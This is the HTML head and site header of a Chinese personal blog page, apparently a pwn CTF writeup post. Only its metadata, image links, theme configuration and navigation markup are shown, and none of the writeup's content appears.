<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.2">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"howahh.github.io.git","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="[toc] pwn writeup记录1.buu 护网杯_2018_gettingstart">
<meta property="og:type" content="article">
<meta property="og:title" content="pwn_wp1">
<meta property="og:url" content="https://howahh.github.io.git/2024/09/26/pwn-wp1/index.html">
<meta property="og:site_name" content="0xahh的博客">
<meta property="og:description" content="[toc] pwn writeup记录1.buu 护网杯_2018_gettingstart">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-8ea95e81369ca2d3c3e805bcf32f0492_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-455547651059df6802f891829a79c35c_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-1097e51ae5e4ed3e65d9e5b98581257d_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-8936aa3c1132ae34178c97ebdaff98c3_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-7a32cf8d7d871815209dd21c5182f934_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-58fc10f0b586d0a99f498eab09793970_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-43b04b5eb6dac6750e561dacf7214206_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-f3b0af03edcda6f07762f93d8e414dce_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-33e7de6d17fdf615154c2004aa2f4d17_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-480f9a75ebf57150def7649aa92c483f_720w.png">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-62badec67735bf28efe626ad5a41d5e1_1440w.png">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-ca0ab6229578c05818a8b7fa342cf991_1440w.png">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-8f62163958b4a75e67ceaa9d76dc55da_1440w.png">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-807aa44601923aa12a9dc220b1c091f5_1440w.png">
<meta property="og:image" content="https://pica.zhimg.com/80/v2-88d85810658cafccceb55b94dc3ef32c_1440w.png">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-ade0e92cc89b94de2ba1d00f0b2e119d_1440w.png">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-25c75f5e46ee047d829116e6664e7bc0_1440w.png">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-bda0716fbf467301721324b60af3be76_1440w.png">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-9ac68336932f6a245c7345d09ed6e4f9_1440w.png">
<meta property="og:image" content="https://pica.zhimg.com/80/v2-9082e86703afe576286db08f2db5a7b9_1440w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-18b043665faa14ee6eb888158d53ed7e_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-cef71d5132bc967c04b09847d8820591_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-e9bf2841b43a663e1bb151d5d16f66d4_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-7001fb1d5068ffc37672d758d7be95c4_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-8756e247791b5348ce68dec53d51abdb_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-15c19f7b3dd7b573cb4ca3c345808c50_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-0c30eb65128bb5f5e668220daa446f77_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-2504ba95ef014d2aa4ec6bd6eb6cd712_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-c22bb01e7d65a7f54a71ab1172bd4ab0_720w.png">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-3b9efe516df3a9da3c662aadebceba6d_1440w.png?source=d16d100b">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-911b55d37671cd7bfae67ad1aa50e22c_1440w.png?source=d16d100b">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-d5b11233febd9932bed3f7f2665c0205_1440w.png?source=d16d100b">
<meta property="og:image" content="https://pica.zhimg.com/80/v2-b463e0517df270723f5f50b2d6988dc1_1440w.png?source=d16d100b">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-4d89bc34e5a2b168309b0fe370168d08_1440w.png?source=d16d100b">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-b7af867ef2376c96b90eea67e3d34dce_1440w.png?source=d16d100b">
<meta property="og:image" content="https://pica.zhimg.com/80/v2-d97534233a8d1c8e06f72d762bcd67eb_1440w.png">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-ca4cebdb86c0afb06bc927358085caa7_1440w.png">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-693e95363746b6763b20b70ef383d284_1440w.png">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-11f329e024c1ace3c76f88c77b370ea4_1440w.png">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-ca30a86df966305c163ab78fda6ad4e8_1440w.png">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-edb544bad74e50db15216b2719f92636_1440w.png">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-82400c2048600b290665072d605847b7_1440w.png">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-c0ef623336500a8ee80eea5fb71f9d5b_1440w.png">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-4c7c856e46d5975170d49d4fe1458ace_1440w.png">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-1117221887e78313cfcf844f24d63485_1440w.png">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-47f5f5479b1232c3aa3587597ba4973d_1440w.png">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-9ffbf696547881efccebe948a9a4f40d_1440w.png">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-67d5cf54b37438006822e76fba530b9b_1440w.png">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-cff4d20c11e092f794be3ec52cebd253_1440w.png">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-b7160ff713f41ad7ec724915861ab0f3_1440w.png">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-5f45625d38cc3f42e03e968f1c3e5e7b_1440w.png">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-4e4338c15e1536568bda6dcd38be8189_1440w.png">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-52ec84fd350f41a8516ca8671d8722ff_1440w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-9f37f35f04fda3f407e2be9944cf02ef_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-d0192eed8a22f52c886a2ecb2002c96a_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-3bd47646cc7cb7be57d67049e0475540_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-51321062a925f5ee8f23904e18542144_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-16b61b8d88a1be467263c4136efa3b1d_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-29e7c69a8e80e23ee14f6f891062e33b_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-0aadbd33b80c405edbc493fb968afb34_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-aaa7a39358206e7f3122bc3e262fd586_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-84644b40eb50359d01c9820a81cd9d75_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-cf4e1642de0ea34ad17a3b6091bc8a82_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-a826db6b23ab2c3dc72dae6df1947999_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-011fbec877dae8328f8f929f8170245d_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-ff1103650617c4771a15a1801f7df23a_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-e711bad1f4d138eea6712aafad0d47bb_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-a74675e6e7928b1c0428c2c759253546_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-d6c25d12f6960f20a23663520d83ec77_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-30af21840af7e392161bc1d7853afe2b_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-77e40d635d7febd725eef59ee9b2bca7_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-556a828e7d556826ca4f0191c80b7c29_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-19e4a04c803d7b18bad56450c3e3199e_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-98fdd301d5fb4895853d790a86285a71_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-d3cf2f66c4b5d1a20194700efece05cd_720w.png">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-a7a6bdf2832e295b1563a4c412a24ccb_720w.png?source=d16d100b">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-7c38be7c7fb87f34a2e73691deab887d_720w.png?source=d16d100b">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-a4bbe0ae2234caadf3cb47983d4dea51_720w.png?source=d16d100b">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-c7ec35dde04f6ea1833154c8f9088c58_720w.png?source=d16d100b">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-51d2a5b16d23916d2565379de3c0bcd9_720w.png?source=d16d100b">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-6af7cf8233c1533eaaee130fc26e8753_720w.png?source=d16d100b">
<meta property="og:image" content="https://pica.zhimg.com/80/v2-42489986ce2c4b64e72223ee55d9d00a_720w.png?source=d16d100b">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-c5301cf1e1894a8a24e03c0aa9163c20_720w.png?source=d16d100b">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-f975e0c4aebdce1827b1d36e0e67fb48_720w.png?source=d16d100b">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-ceed17a339532869fbacfca532b92de1_720w.png?source=d16d100b">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-c889f4aef31639473206094ee0be98df_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-7a11e206a467a8edf2096e018125793e_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-5bd70dcf6cd5182f723ca3592508f287_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-ac3d56ea1bb6edaaec7e6a6b8b00a3c5_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-5ca8045285b81f221e54efe8113aa225_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-ac810439a1107623703d6102822ea37f_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-57295fe9423d61959da68ce60f9bbd6c_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-db58e35d935c167b04df4723cd7a82f2_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-26cb56340a9a792e776cccb5aa494fe7_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-01fb2a3e790168d60966a2854cecccf5_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-d832b6dbcc50ac9d9b87e6b3994d0cea_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-cdefd4d8c94265182f2a26261eb65918_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-c3a28334852fd8d043ca8613f580fec2_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-0bea51bcf199a360fff1cdb711ab5780_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-67172598436c03762ad972bb89b8feec_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-433b6f123ba8f76f44428d9f2dcae61c_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-83b59f071bcf59f05dd0eb573947e147_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-cc61b142353de54cb43ee107517947d9_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-30d000f43cd4597d46d1e1bf547a31fa_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-2b5ac2c9eecfa986ffc4df864d75077d_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-030d66b15d2681fd060e4c82a55a6247_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-3019b69b9d634eba5e3482aa840e9180_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-fb622c669105b360a959a28656e5d3a3_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-74b0eae90879f797b724b40ee01940be_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-05e51fd701112b3d4846308d99c8b85e_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-634ccc683c0f10039d5272298f0f637b_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-2bb212aaf9534073248543b6a7e04e8b_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-a3305a4af9433ebdcf6b1c361e7842bc_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-316be944a8a65ba58dfefb17ee13e3b6_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-878b1f80a0e6e5be8b9dc21fc138a75b_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-1d8db336d965f1e0f0b488716edd6476_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-7f9bc7c9b8f38bf94a17b695206654aa_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-138ebb448288e2be25550c89e2c0981b_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-98421bb7ca50274234095cf8b3f0fbc2_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-fa7449db8b789a39a470cfb79ae7c8d5_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-8f709e7c809f290087ce09ef3d5a309d_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-21de082f7393e040d28092167dc9c09a_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-f96747fdfb10b4653f9b06a0e669d48a_720w.png">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-b0125b646173b3d0b94871ff5436b723_720w.png?source=d16d100b">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-ef0734bcc314d6b1b811c6f29087368e_720w.png">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-7f3db859534244d132a18829577df84e_720w.png?source=d16d100b">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-10aeea6f9ee79d471de96cc2430a8c16_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-18b587aa1c5168af5e39bbddc17ba3b0_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-796bd71c235ea2f9ef30a658696727f6_720w.png">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-69cf474aea88aff165b86d12c4d6f9ad_720w.png?source=d16d100b">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-9a5ae4244d36c8988b8991c10043be39_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-a83e9e086045ce5d356b844a5cf22260_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-165beedbf0aa03743715bd29498fd9f9_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-e766a7d1c62c3347c3c67a7be97b1b96_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-d5d3151f3740554c6889f6ea94988993_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-80938edc338c0b7921c6465e05569306_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-88943ad034be139fc19d98e5bbc782b5_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-f83e973a7fad85175059c15928dd4841_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-eb2e4805a009bc27140b0ee88947dd59_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-0d3645daeca95d58cc19bc6fc79e952f_720w.png">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-1e2a3db0b73c6b3df806506c6cf17e9a_1440w.png?source=d16d100b">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-4cdaea2b32aff37c177b38903194412a_1440w.png?source=d16d100b">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-11fe40eaf7fd8692e843c0e74ebda34b_1440w.png?source=d16d100b">
<meta property="og:image" content="https://pica.zhimg.com/80/v2-55c9412c52b8af0c5c7461da4d28bc82_1440w.png?source=d16d100b">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-dc7dec7977571772b097b007d52f4318_1440w.png?source=d16d100b">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-db3b030ac7ef0f75df1a5002bfa99140_1440w.png?source=d16d100b">
<meta property="og:image" content="https://pica.zhimg.com/80/v2-e99fd911c9bef609244bd1addd4c45fc_1440w.png?source=d16d100b">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-7eb0ade68fb7d32af4091b64ab97e2a0_1440w.png?source=d16d100b">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-ed8f9e59706d93d7ca7db5df8b796d46_1440w.png">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-35f514b3cafc6655743c052714756b51_1440w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-72c99366c8ffe602f41f1ab4ae7446c5_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-b7b14a8dfe4408f127a343db508a9162_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-976c269cd88add566bdba52279894a1d_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-70c4b38d37e55362e88677870b0ce892_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-2d8620b4a16519e5118d874ce8886a3a_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-bc2b811f81d2e07ca1407c683853a002_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-ef5121893f71f6a164296679262e928e_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-024c27cff060625ecafaa49357a0e66c_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-4e3b2350bdbc6e22d2e54aa4afb97723_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-7eadddb0e33cabdef775649f16fca80a_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-448be107984055c97f66d1747e24c55f_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-eb36717192c94826efd9c0cd5ee1830e_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-677bd322b036405341c377f480b93c3a_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-06ff5bbee2b653539d13d4f5572406c7_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-b0b3362bce8c4a705d49fe2a1327bae5_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-393efeac789f4f895b984b586bbf3f67_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-bee39b6c31c579e8e837c1515e01ca23_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-67a4d79e23f826d3f5ab229a13aed06a_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-734636986e51f627a943800e06114741_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-ba20a865513f50180470f284425e5440_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-d0dd4d93af8bc930cf2a0d15d9fa72c7_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-bde74c2e2a2b6acc8f59fcb682cc0b5c_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-b5143077206ddf15e77ad771ce6b68f4_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-7cc9647a1121a93932e58c8ad9c7651f_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-261d91d499fd897cf686584483b19574_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-c1210592d3921ff20255bd24c971ad8c_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-f43590a029c66d3e8748ff5c138698df_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-46afc59d600ab93557e9586f194d5c5e_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-5e49902c3676419f8621aaea786e49f2_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-80e01f17ba3360bf0e5d20dfc565242a_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-c7604d5a4581177ba4ecb780ee4852d3_720w.png">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-2c053577ce9fed18a2b816c2fd928304_1440w.png?source=d16d100b">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-fb8f376f63d34edde4ee8d0381738b98_1440w.png?source=d16d100b">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-6e935ccb0f42b73362dd53b7ea9f123d_1440w.png?source=d16d100b">
<meta property="og:image" content="https://pica.zhimg.com/80/v2-2d7fecc5f5574b4807254d85db8a681c_1440w.png?source=d16d100b">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-edb0953ecf39bdb4057015e1170186e6_1440w.png?source=d16d100b">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-c8a39b919cb680b14417dbe48640313a_1440w.png?source=d16d100b">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-69937e4faca0167ec00f23fa5999220c_1440w.png?source=d16d100b">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-a6b671bccaa5a8504bca1b8643ec396a_1440w.png?source=d16d100b">
<meta property="og:image" content="https://pica.zhimg.com/80/v2-c51975baa2f51e6a84ef833e0ee81735_1440w.png?source=d16d100b">
<meta property="og:image" content="https://pica.zhimg.com/80/v2-b01e610700930f18a295b1cec296c80e_1440w.png?source=d16d100b">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-a7758f1ce7b32bd093d39a3eb152db57_1440w.png?source=d16d100b">
<meta property="og:image" content="https://pica.zhimg.com/80/v2-06764f01810c04f8fbc7810c64da5dcf_1440w.png?source=d16d100b">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-bcd99d3cfe509aac10cb1c3b9299c6a2_1440w.png?source=d16d100b">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-a00703f249aee18377de96e61199ecf0_1440w.png?source=d16d100b">
<meta property="og:image" content="https://picx.zhimg.com/80/v2-68e61a490a3db48e39e60f13c93e026d_1440w.png?source=d16d100b">
<meta property="og:image" content="https://pica.zhimg.com/80/v2-6426a139ea2e35e2cdbb0008f6ada0d6_1440w.png?source=d16d100b">
<meta property="og:image" content="https://pic1.zhimg.com/80/v2-11ab2d4bbc59f9f3a67d57369d946692_1440w.png?source=d16d100b">
<meta property="og:image" content="https://pica.zhimg.com/80/v2-ea80ef4d9076901c8f0b6e57bedbcfd9_1440w.png?source=d16d100b">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-96dc65fcb10078d4dd7cecabfa90c292_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-a6ec5c57d287164ea8bef12f79ee3f0a_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-e96a44290c6b2cf81e43a5b0951f52cf_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-299dde1c29ff02de716670269f52369f_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-21f4e4dcce738885db030d040e050498_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-302f0f7d4d1b09fcdeee7546d3145174_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-202f5a89bc2bfe5203e0641e660342ee_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-6936d439d28b7e611ec74f3f892ff95f_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-ff0888bfa35fe4ccb5418d10b3829e98_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-5304164eddf79e50648382ca4602f8a4_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-a664579261ee1d882656e1e0c4faedca_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-e077aa42a6a639c70a79805b191e12a3_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/v2-305025ff7ddd7525d50c9929cc654192_720w.png">
<meta property="og:image" content="https://howahh.github.io.git/images/QQ_1725937321813.png">
<meta property="og:image" content="https://howahh.github.io.git/images/QQ_1725937795980.png">
<meta property="og:image" content="https://howahh.github.io.git/images/image-20240910191056905.png">
<meta property="og:image" content="https://howahh.github.io.git/images/image-20240910185714987.png">
<meta property="og:image" content="https://howahh.github.io.git/images/image-20240910191628662.png">
<meta property="og:image" content="https://howahh.github.io.git/images/image-20240910192133617.png">
<meta property="og:image" content="https://howahh.github.io.git/images/image-20240910193158798.png">
<meta property="og:image" content="https://howahh.github.io.git/images/image-20240911164614781.png">
<meta property="og:image" content="https://howahh.github.io.git/images/image-20240911164637646.png">
<meta property="og:image" content="https://howahh.github.io.git/images/image-20240912100123929.png">
<meta property="og:image" content="https://howahh.github.io.git/images/image-20240912100632381.png">
<meta property="og:image" content="https://howahh.github.io.git/images/image-20240912100255933.png">
<meta property="og:image" content="https://howahh.github.io.git/images/image-20240912100344198.png">
<meta property="og:image" content="https://howahh.github.io.git/images/image-20240912100531789.png">
<meta property="og:image" content="https://howahh.github.io.git/images/image-20240912162209777.png">
<meta property="og:image" content="https://howahh.github.io.git/images/image-20240912162314653.png">
<meta property="og:image" content="https://howahh.github.io.git/images/image-20240912163551278.png">
<meta property="og:image" content="https://howahh.github.io.git/images/image-20240912164743315.png">
<meta property="og:image" content="https://howahh.github.io.git/images/image-20240912164818726.png">
<meta property="og:image" content="https://howahh.github.io.git/images/QQ_1726217937951.png">
<meta property="og:image" content="https://howahh.github.io.git/images/QQ_1726218332387.png">
<meta property="og:image" content="https://howahh.github.io.git/images/QQ_1726218524415.png">
<meta property="og:image" content="https://howahh.github.io.git/images/QQ_1726218707908.png">
<meta property="article:published_time" content="2024-09-26T11:16:45.000Z">
<meta property="article:modified_time" content="2024-09-26T13:04:07.355Z">
<meta property="article:author" content="0xahh">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://howahh.github.io.git/images/v2-8ea95e81369ca2d3c3e805bcf32f0492_720w.png">

<link rel="canonical" href="https://howahh.github.io.git/2024/09/26/pwn-wp1/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>pwn_wp1 | 0xahh的博客</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">0xahh的博客</h1>
      <span class="logo-line-after"><i></i></span>
